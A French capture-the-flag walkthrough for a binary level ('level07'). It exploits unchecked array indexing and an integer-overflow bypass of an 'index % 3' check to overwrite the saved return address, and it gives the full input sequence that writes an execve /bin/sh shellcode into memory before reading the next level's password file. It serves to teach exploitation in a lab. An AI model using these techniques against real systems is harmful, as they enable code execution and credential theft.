Ce binaire etait plus difficile que les autres a exploiter.

Son fonctionnement est plutot simple : 
Il boucle a l'infini, en demandant une entree a l'utilisateur (a la maniere d'un shell). Il y a 3 commandes possibles : store, read et quit. 

store : Demande un index puis une valeur, puis stock la valeur a l'index indique.
read  : Demande un index puis lit la valeur a l'index indique.
quit  : Quitte le binaire

En desassemblant le binaire pour en savoir un peu plus, on peut noter plusieurs choses : 

Un test est effectue sur l'index que nous indiquons :` if (index % 3 == 0)` ...
Si ce test se revele etre vrai, alors un message d'erreur s'affiche nous indiquant que nous ne pouvons
pas stocker de nombre a cet index. Cela sera tres important pour la suite.

Nous voyons egalement que aucune verification n'est mise en place pour verifier la valeur que nous 
envoyons a store ou a read.
Ainsi, nous pouvons lire a des indexs ayant pour valeur une negative ou alors une valeur > 100 (le tableau de data faisant 100*4 bytes). ceci est egalement tres important pour la suite. 

Nous savons donc que nous pouvons ecrire ou nous voulons en memoire. Enfin presque, car le index % 3 nous complique la tache. Une maniere de le contourner est la suivant :

Lui passer une valeur >= au INT_MAX afin de recuperer uniquement la difference entre INT_MAX + x
Nous savons qu'en memoire notre valeur est multiplie par 4 car il s'agit d'un tableau de int (4 bytes).
Voici par exemple commnent ecrire a l'index 0 : 
`4294967295 / 4 = 1073741823 + 1 = 1073741824`. Avec cette valeur, nous pouvons ecrire a l'index 0 (data[0])
car `1073741824 % 3 == 1`. Le test est donc respecte. Nous allons utiliser cette methode pour ecrire 
aux endroits "interdits" en memoire. 

J'ai donc decide d'ecraser la sauvegarde EIP du main. Pour cela, il suffit de la leaker :

	$ gdb level07
	$ b*main+455
	$ r
	$ store
	$ i f

	eip = 0x80488ea in main; saved eip 0xf7e45513


Maintenant, nous allons dumper notre stack avec read_number jusqu'a obtention de la valeur "0x80488ea"
qui correspond a EIP du main. 

En faisant plusieurs essai avec des valeurs > 100, on se rend compte que la sauvegarde d'EIP se trouve
a l'index 114 :

	$ ./level07
	$ read
	$ 114
	
	Number at data[114] is 4158936339     <--- 0xf7e45513

Par chance, l'index 114 etait rapide a trouver. Cependant j'ai quand meme creer un script d'automatisation (voir Ressources/find_eip.sh)

Maintenant que nous avons tous ces elements, l'idee est de stocker l'adresse de notre shellcode a l'adresse
de data[0] puis d'ecraser sEIP avec l'adresse 0 de notre tableau data.
Le probleme, c'est que lors de l'execution du binaire, l'environement semble etre "efface". Le trick 
va donc etre de stocker notre shellcode (4 bytes par 4 bytes) dans les adresse de data[0] a data[5], puis, de sauter dessus en ecran sEIP par l'adresse de data[0], comme indique ci-dessus. 
Je rappel que nous ne pouvons pas ecrire a tous les index que nous souhaitons, nous allons donc parfois
devoir jouer avec l'overflow, comme indique au debut du walkthrough.

Il y a egalement un decalage memoire entre gdb et sans gdb. L'adresse de notre tableau data n'est donc pas la meme selon si on lance le binaire avec gdb ou non.
Pour la trouver, c'est assez simple. Dans gdb, il suffit de run le binaire puis de chercher, via des index negatifs, ou se trouve l'adresse du tableau.
En faisaint :

	$ gdb level07
	$ start
	$ read
	$ -9
	
On obtient : 0xffffd544 (en decimal). Il suffit donc de proceder pareil hors gdb pour obtenir l'adresse de notre tableau :

	0xffffd564 (4294956388)

J'ai choisi le shellcode suivant (23 bytes) : http://shell-storm.org/shellcode/files/shellcode-827.php

Et voici notre exploit : 

		store
		1750122545        # \x31\xc0\x50\x68
		1073741824        # data[0] (en utilisant la methode de l'overflow)
		store
		1752379183	  # \x2f\x2f\x73\x68
		1		  # data[1]
		store
		1768042344	  # \x68\x2f\x62\x69
		2		  # data[2]
		store
		1357089134        # \x6e\x89\xe3\x50
		1073741827	  # data[3] (en utilisant la methode de l'overflow)
		store
		2967570771	  # \x53\x89\xe1\xb0
		4		  # data[4]
		store
		8441099		  # \x0b\xcd\x80	
		5
		store
		4294956388	  # adresse de data[0] 
		1073741938        # data[114] (save eip)
		quit

`cat /home/users/level08/.pass`
